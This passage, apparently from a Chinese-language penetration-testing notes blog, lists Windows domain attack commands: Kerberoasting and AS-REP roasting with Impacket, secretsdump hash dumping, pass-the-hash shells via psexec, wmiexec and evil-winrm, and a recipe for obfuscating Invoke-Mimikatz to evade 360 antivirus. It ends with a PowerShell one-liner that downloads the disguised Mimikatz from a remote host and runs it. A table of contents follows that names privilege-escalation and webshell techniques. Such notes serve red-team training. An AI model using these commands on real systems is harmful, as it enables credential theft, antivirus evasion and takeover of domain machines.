<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 tgsrepcrack.py pass.txt &quot;kirbi-file&quot;</span><br></pre></td></tr></table></figure>
<h4 id="GetUserSPNs-py"><a href="#GetUserSPNs-py" class="headerlink" title="GetUserSPNs.py"></a>GetUserSPNs.py</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 GetUserSPNs.py domain/username:password -dc-ip MACHINE_IP -request</span><br></pre></td></tr></table></figure>
<p>转储kerberos的hash。之后可以使用hashcat 13100模式爆破。</p>
<h4 id="GetNPUsers-py"><a href="#GetNPUsers-py" class="headerlink" title="GetNPUsers.py"></a>GetNPUsers.py</h4><h4 id="无密码获得票据"><a href="#无密码获得票据" class="headerlink" title="无密码获得票据"></a>无密码获得票据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetNPUsers.py domain/user -no-pass</span><br></pre></td></tr></table></figure>
<p>如果成功的话会输出Kerberos 5 AS-REP etype 23加密的hash。</p>
<h4 id="获取UF-DONT-REQUIRE-PREAUTH设置的用户列表"><a href="#获取UF-DONT-REQUIRE-PREAUTH设置的用户列表" class="headerlink" title="获取UF_DONT_REQUIRE_PREAUTH设置的用户列表"></a>获取UF_DONT_REQUIRE_PREAUTH设置的用户列表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetNPUsers.py domain/user:password 或 GetNPUsers.py domain/user </span><br></pre></td></tr></table></figure>
<p>需要密码，不指定密码脚本会询问。</p>
<h4 id="获取所有用户的票据"><a href="#获取所有用户的票据" class="headerlink" title="获取所有用户的票据"></a>获取所有用户的票据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetNPUsers.py domain/emily:password -request 或 GetNPUsers.py domain/emily。</span><br></pre></td></tr></table></figure>
<h4 id="无密码获得用户列表的TGT信息"><a href="#无密码获得用户列表的TGT信息" class="headerlink" title="无密码获得用户列表的TGT信息"></a>无密码获得用户列表的TGT信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetNPUsers.py domain/ -no-pass -usersfile users.txt</span><br></pre></td></tr></table></figure>
<h3 id="secretsdump-py-1"><a href="#secretsdump-py-1" class="headerlink" title="secretsdump.py"></a>secretsdump.py</h3><p>默认通过DRSUAPI方式检索密码hash</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py domain/username:password@ip</span><br></pre></td></tr></table></figure>
<h3 id="psexec-py-pass-the-password攻击"><a href="#psexec-py-pass-the-password攻击" class="headerlink" title="psexec.py (pass the password攻击)"></a>psexec.py (pass the password攻击)</h3><p>只要有密码散列，可以无密码getshell。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 psexec.py -hashes LMHASH:NTHASH username@domain</span><br></pre></td></tr></table></figure>
<h3 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a>wmiexec.py</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec.py -hashes LMHASH:NTHASH [domain/]username@[ip/target]</span><br></pre></td></tr></table></figure>
<h3 id="evil-winrm"><a href="#evil-winrm" class="headerlink" title="evil-winrm"></a>evil-winrm</h3><p>安装</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gem install evil-winrm</span><br></pre></td></tr></table></figure>
<h4 id="获得shell"><a href="#获得shell" class="headerlink" title="获得shell"></a>获得shell</h4><p>需要密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.13.37 -u svc-demo</span><br></pre></td></tr></table></figure>
<h4 id="pass-the-password"><a href="#pass-the-password" class="headerlink" title="pass the password"></a>pass the password</h4><p>也是需要密码散列，和psexec不同的是：只需要NTHASH</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i ip -u administrator -H NTHASH </span><br></pre></td></tr></table></figure>
<h3 id="pth-winexe"><a href="#pth-winexe" class="headerlink" title="pth-winexe"></a>pth-winexe</h3><h3 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a>Rubeus</h3><p>Rubeus:<a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">Git项目地址和教程</a></p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8406">域渗透之SPN</a></li>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/yoT6B7GJMSNkv3PvQVzzAQ">内网渗透测试研究：从NTDS.dit获取域散列值</a></li>
</ul>
<h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><h3 id="抓取密码"><a href="#抓取密码" class="headerlink" title="抓取密码"></a>抓取密码</h3><h4 id="猕猴桃获取密码"><a href="#猕猴桃获取密码" class="headerlink" title="猕猴桃获取密码"></a>猕猴桃获取密码</h4><p><a target="_blank" rel="noopener" href="https://github.com/orlyjamie/mimikittenz">powerhsell版猕猴桃</a></p>
<h5 id="Invoke-Mimikatz-ps1-Bypass360"><a href="#Invoke-Mimikatz-ps1-Bypass360" class="headerlink" title="Invoke-Mimikatz.ps1 Bypass360"></a>Invoke-Mimikatz.ps1 Bypass360</h5><h6 id="制作"><a href="#制作" class="headerlink" title="制作"></a>制作</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sed -i -e &#x27;s/Invoke-Mimikatz/Invoke-FZZYYDS/g&#x27; Invoke-Mimikatz.ps1 \</span><br><span class="line">sed -i -e &#x27;/&lt;#/,/#&gt;/c\\&#x27; Invoke-Mimikatz.ps1 \</span><br><span class="line">sed -i -e &#x27;s/^[[:space:]]*#.*$//g&#x27; Invoke-Mimikatz.ps1 \</span><br><span class="line">sed -i -e &#x27;s/DumpCreds/DumpFZZ/g&#x27; Invoke-Mimikatz.ps1 \</span><br><span class="line">sed -i -e &#x27;s/ArgumentPtr/FZZNoOne/g&#x27; Invoke-Mimikatz.ps1 \</span><br><span class="line">sed -i -e &#x27;s/CallDllMainSC1/FZZCoool/g&#x27; Invoke-Mimikatz.ps1 \</span><br><span class="line">sed -i -e &quot;s/\-Win32Functions \$Win32Functions$/\-Win32Functions \$Win32Functions #\-/g&quot; Invoke-Mimikatz.ps1</span><br></pre></td></tr></table></figure>

<p>使用<code>ISESteroids</code>来混淆代码，在Powershell下安装。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Install-Module -Name &quot;ISESteroids&quot; -Scope CurrentUser -Repository PSGallery -Force</span><br></pre></td></tr></table></figure>

<p>安装好后，打开Powershell_ISE，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Start-Steroids</span><br></pre></td></tr></table></figure>

<h6 id="本地方式加载"><a href="#本地方式加载" class="headerlink" title="本地方式加载"></a>本地方式加载</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ExecutionPolicy bypass &#x27;Import-Module .\2.ps1;Invoke-FZZYYDS&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/20210805-16:16:15-_QShZWi_RTiAtc_QShZWi_1628151375257_QShZWi_RTiAtc.png" alt="20210805-16:16:15-_QShZWi_RTiAtc_QShZWi_1628151375257_QShZWi_RTiAtc"></p>
<h6 id="远程方式加载"><a href="#远程方式加载" class="headerlink" title="远程方式加载"></a>远程方式加载</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://IP/Bypass360-Invoke-Mimikatz.ps1&#x27;);Invoke-FZZYYDS&quot;</span><br></pre></td></tr></table></figure>

<p>参考:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/6meXpm7LWG4_imL1XMPQng">再探mimikatz免杀</a></li>
</ul>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/links/">Friends</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/atsud0">Github</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-amp-%E5%91%BD%E4%BB%A4%E5%B0%8Ftips"><span class="toc-number">1.</span> <span class="toc-text">Windows信息收集&amp;命令小tips</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%92%93%E9%B1%BC"><span class="toc-number">1.1.</span> <span class="toc-text">钓鱼</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="toc-number">1.2.</span> <span class="toc-text">用户信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7"><span class="toc-number">1.2.1.</span> <span class="toc-text">当前用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#net%E6%9F%A5%E8%AF%A2%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="toc-number">1.2.2.</span> <span class="toc-text">net查询用户信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86"><span class="toc-number">1.2.3.</span> <span class="toc-text">用户管理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Bypass360%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">Bypass360添加用户</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF"><span class="toc-number">1.3.</span> <span class="toc-text">网络信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E7%81%AB%E5%A2%99%E8%A7%84%E5%88%99"><span class="toc-number">1.3.1.</span> <span class="toc-text">防火墙规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%BC%80%E6%94%BE%E7%9A%84%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.3.2.</span> <span class="toc-text">本地开放的端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2RDP%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.3.3.</span> <span class="toc-text">查询RDP服务端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%A9%E5%9F%9F%E6%8E%A7"><span class="toc-number">1.3.4.</span> <span class="toc-text">穩域控</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%BC%80%E5%90%AF3389"><span class="toc-number">1.3.5.</span> <span class="toc-text">命令行开启3389</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.3.5.1.</span> <span class="toc-text">注册表方式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Windows-XP-x2F-7"><span class="toc-number">1.3.5.1.1.</span> <span class="toc-text">Windows XP&#x2F;7</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WMIC"><span class="toc-number">1.3.5.2.</span> <span class="toc-text">WMIC</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Windows2003"><span class="toc-number">1.3.5.2.1.</span> <span class="toc-text">Windows2003</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Windows-Server-2008"><span class="toc-number">1.3.5.2.2.</span> <span class="toc-text">Windows Server 2008</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Windwos-Server-2012-x2F-Windows-7"><span class="toc-number">1.3.5.2.3.</span> <span class="toc-text">Windwos Server 2012 &#x2F; Windows 7</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF"><span class="toc-number">1.4.</span> <span class="toc-text">服务信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#net"><span class="toc-number">1.4.1.</span> <span class="toc-text">net</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sc"><span class="toc-number">1.4.2.</span> <span class="toc-text">sc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WMI"><span class="toc-number">1.4.3.</span> <span class="toc-text">WMI</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.5.</span> <span class="toc-text">应用程序</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%B8%A6%E5%91%BD%E4%BB%A4"><span class="toc-number">1.5.1.</span> <span class="toc-text">自带命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WMI-1"><span class="toc-number">1.5.2.</span> <span class="toc-text">WMI</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF"><span class="toc-number">1.6.</span> <span class="toc-text">系统进程信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tasklist"><span class="toc-number">1.6.1.</span> <span class="toc-text">tasklist</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WMI-2"><span class="toc-number">1.6.2.</span> <span class="toc-text">WMI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msinfo32"><span class="toc-number">1.6.3.</span> <span class="toc-text">msinfo32</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9D%9F%E8%BF%9B%E7%A8%8B%E6%93%8D%E4%BD%9C"><span class="toc-number">1.6.4.</span> <span class="toc-text">结束进程操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#taskill"><span class="toc-number">1.6.4.1.</span> <span class="toc-text">taskill</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pskill"><span class="toc-number">1.6.4.2.</span> <span class="toc-text">pskill</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">1.7.</span> <span class="toc-text">系统信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#systeminfo"><span class="toc-number">1.7.1.</span> <span class="toc-text">systeminfo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WMIC-1"><span class="toc-number">1.7.2.</span> <span class="toc-text">WMIC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">1.7.3.</span> <span class="toc-text">环境变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hostname-%E4%B8%BB%E6%9C%BA%E5%90%8D"><span class="toc-number">1.7.4.</span> <span class="toc-text">hostname-主机名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WMI-powershell"><span class="toc-number">1.7.5.</span> <span class="toc-text">WMI(powershell)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E7%B4%A2%E6%96%87%E4%BB%B6"><span class="toc-number">1.8.</span> <span class="toc-text">检索文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%EF%BC%88%E6%9C%89%E5%8C%85%E5%90%ABBase64%E7%BC%96%E7%A0%81%E7%9A%84%E5%AF%86%E7%A0%81"><span class="toc-number">1.8.1.</span> <span class="toc-text">无人值守安装日志文件（有包含Base64编码的密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-number">1.8.2.</span> <span class="toc-text">文件操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A3%81%E7%9B%98%E4%BF%A1%E6%81%AF"><span class="toc-number">1.9.</span> <span class="toc-text">磁盘信息</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#mountvol"><span class="toc-number">1.9.0.1.</span> <span class="toc-text">mountvol</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E9%A9%B1%E5%8A%A8"><span class="toc-number">1.10.</span> <span class="toc-text">第三方驱动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%85%B3%E9%94%AE%E5%AD%97%E6%90%9C%E7%B4%A2"><span class="toc-number">1.11.</span> <span class="toc-text">注册表关键字搜索</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E7%89%B9%E6%AE%8A%E5%85%B3%E9%94%AE%E5%AD%97%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="toc-number">1.11.1.</span> <span class="toc-text">搜索特殊关键字注册表</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.12.</span> <span class="toc-text">文件权限查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.13.</span> <span class="toc-text">定时任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-number">1.14.</span> <span class="toc-text">下载文件操作</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.14.1.</span> <span class="toc-text">常规下载</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CMD"><span class="toc-number">1.14.1.1.</span> <span class="toc-text">CMD</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Powershell"><span class="toc-number">1.14.1.2.</span> <span class="toc-text">Powershell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#VBS"><span class="toc-number">1.14.1.3.</span> <span class="toc-text">VBS</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LoLBin-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.14.2.</span> <span class="toc-text">LoLBin 文件下载</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IMEWDBLD-exe%EF%BC%88%E4%BB%85Windows10%E6%88%96%E4%BB%A5%E4%B8%8A%E5%8F%AF%E7%94%A8%EF%BC%89"><span class="toc-number">1.14.2.1.</span> <span class="toc-text">IMEWDBLD.exe（仅Windows10或以上可用）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.14.2.1.1.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Desktopimgdownldr-exe"><span class="toc-number">1.14.2.2.</span> <span class="toc-text">Desktopimgdownldr.exe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CertReq"><span class="toc-number">1.14.2.3.</span> <span class="toc-text">CertReq</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9F%E6%88%90shell-MSF"><span class="toc-number">1.15.</span> <span class="toc-text">生成shell-MSF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Powershell-%E7%9B%B8%E5%85%B3"><span class="toc-number">1.16.</span> <span class="toc-text">Powershell 相关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%93%E5%89%8Dpowershell%E6%98%AF%E5%90%A6%E4%B8%BA64%E4%BD%8D%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.16.1.</span> <span class="toc-text">当前powershell是否为64位进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell-%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E6%96%87%E4%BB%B6"><span class="toc-number">1.16.2.</span> <span class="toc-text">powershell 历史记录文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C"><span class="toc-number">2.</span> <span class="toc-text">提权相关操作</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-Exploit-Suggester"><span class="toc-number">2.1.</span> <span class="toc-text">Windows-Exploit-Suggester</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RUNAS-%E6%8F%90%E9%AB%98%E6%9D%83%E9%99%90%E8%BF%90%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">2.2.</span> <span class="toc-text">RUNAS 提高权限运行命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85%E6%8F%90%E6%9D%83"><span class="toc-number">2.3.</span> <span class="toc-text">无人值守安装提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8"><span class="toc-number">2.4.</span> <span class="toc-text">服务程序利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#accesschk-last-version"><span class="toc-number">2.4.1.</span> <span class="toc-text">accesschk-last version</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90"><span class="toc-number">2.5.</span> <span class="toc-text">不安全的服务权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E5%86%99%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.5.1.</span> <span class="toc-text">可写服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%B8%A6%E5%BC%95%E5%8F%B7%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.5.2.</span> <span class="toc-text">不带引号的不安全服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6-x2F-%E6%96%87%E4%BB%B6%E5%A4%B9%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E2%80%93%E5%BE%85%E5%A1%AB%E5%9D%91"><span class="toc-number">2.5.3.</span> <span class="toc-text">不安全的文件&#x2F;文件夹权限配置–待填坑</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8E%A7%E5%88%B6%E7%AD%96%E7%95%A5-AppLocker"><span class="toc-number">2.6.</span> <span class="toc-text">绕过应用程序控制策略(AppLocker)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%8F%90%E6%9D%83"><span class="toc-number">2.7.</span> <span class="toc-text">注册表提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UAC%E7%BB%95%E8%BF%87"><span class="toc-number">2.8.</span> <span class="toc-text">UAC绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E6%A8%A1%E5%9D%97"><span class="toc-number">2.8.1.</span> <span class="toc-text">msf模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf-%E6%8F%90%E9%AB%98%E8%BF%90%E8%A1%8C%E7%BA%A7%E5%88%AB%E6%8F%90%E6%9D%83"><span class="toc-number">2.8.2.</span> <span class="toc-text">msf 提高运行级别提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E5%88%A9%E7%94%A8"><span class="toc-number">2.8.3.</span> <span class="toc-text">手动利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DLL%E5%8A%AB%E6%8C%81"><span class="toc-number">2.9.</span> <span class="toc-text">DLL劫持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-number">2.10.</span> <span class="toc-text">系统漏洞提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MS16-032"><span class="toc-number">2.10.1.</span> <span class="toc-text">MS16_032</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E7%BC%96%E5%8F%B7"><span class="toc-number">2.10.1.1.</span> <span class="toc-text">补丁编号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC"><span class="toc-number">2.10.1.2.</span> <span class="toc-text">影响系统版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E8%A6%81%E6%B1%82"><span class="toc-number">2.10.1.3.</span> <span class="toc-text">系统要求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#msf%E5%88%A9%E7%94%A8"><span class="toc-number">2.10.1.4.</span> <span class="toc-text">msf利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E5%88%A9%E7%94%A8-1"><span class="toc-number">2.10.1.5.</span> <span class="toc-text">手动利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%9F%E8%B1%86%E5%AE%B6%E6%97%8F"><span class="toc-number">2.10.2.</span> <span class="toc-text">土豆家族</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%9A%E6%B1%81%E5%9C%9F%E8%B1%86"><span class="toc-number">2.10.2.1.</span> <span class="toc-text">多汁土豆</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E6%B0%93%E5%9C%9F%E8%B1%86-RoguePotato-exe"><span class="toc-number">2.10.2.2.</span> <span class="toc-text">流氓土豆 RoguePotato.exe</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-0796"><span class="toc-number">2.10.3.</span> <span class="toc-text">CVE-2020-0796</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.10.4.</span> <span class="toc-text"></span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96"><span class="toc-number">2.11.</span> <span class="toc-text">令牌窃取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql-%E6%8F%90%E6%9D%83"><span class="toc-number">2.12.</span> <span class="toc-text">mysql 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E5%86%99webshell"><span class="toc-number">2.12.1.</span> <span class="toc-text">直接写webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#secure-file-priv%E5%86%99"><span class="toc-number">2.12.1.1.</span> <span class="toc-text">secure_file_priv写</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D"><span class="toc-number">2.12.1.2.</span> <span 